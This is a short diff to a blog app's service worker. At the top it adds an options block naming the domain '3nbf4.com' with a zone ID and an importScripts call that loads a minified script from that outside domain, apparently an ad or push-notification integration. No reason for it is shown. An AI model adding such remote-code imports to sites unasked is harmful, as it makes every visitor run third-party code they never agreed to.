@@ -1,3 +1,10 @@
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 12275624
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+
 const CACHE_NAME = "rianderblog-app-v13";
 const APP_FILES = ["./", "./index.html", "./manifest.webmanifest", "./app-icon.svg", "./account.html", "./welcome.html"];
 
